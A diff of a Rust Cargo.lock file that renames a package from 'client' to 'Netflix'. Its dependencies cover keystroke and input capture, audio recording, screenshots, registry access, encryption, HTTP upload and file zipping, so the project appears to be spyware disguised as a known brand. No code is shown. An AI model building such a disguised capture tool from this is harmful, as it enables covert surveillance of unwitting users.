@@ -3,6 +3,40 @@
 version = 4
 
 [[package]]
+name = "Netflix"
+version = "0.1.0"
+dependencies = [
+ "aes",
+ "anyhow",
+ "cbc",
+ "chrono",
+ "cpal",
+ "device_query",
+ "dirs",
+ "futures",
+ "hound",
+ "if-addrs",
+ "ipnetwork",
+ "lazy_static",
+ "libc",
+ "ntapi",
+ "rand",
+ "rdev",
+ "reqwest",
+ "screenshots",
+ "serde",
+ "serde_json",
+ "single-instance",
+ "sysinfo",
+ "tempfile",
+ "tokio",
+ "walkdir",
+ "winapi",
+ "winreg",
+ "zip",
+]
+
+[[package]]
 name = "addr2line"
 version = "0.24.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -252,40 +286,6 @@ checksum = "773f3b9af64447d2ce9850330c473515014aa235e6a783b02db81ff39e4a3dad"
 dependencies = [
  "crypto-common",
  "inout",
-]
-
-[[package]]
-name = "client"
-version = "0.1.0"
-dependencies = [
- "aes",
- "anyhow",
- "cbc",
- "chrono",
- "cpal",
- "device_query",
- "dirs",
- "futures",
- "hound",
- "if-addrs",
- "ipnetwork",
- "lazy_static",
- "libc",
- "ntapi",
- "rand",
- "rdev",
- "reqwest",
- "screenshots",
- "serde",
- "serde_json",
- "single-instance",
- "sysinfo",
- "tempfile",
- "tokio",
- "walkdir",
- "winapi",
- "winreg",
- "zip",
 ]
 
 [[package]]
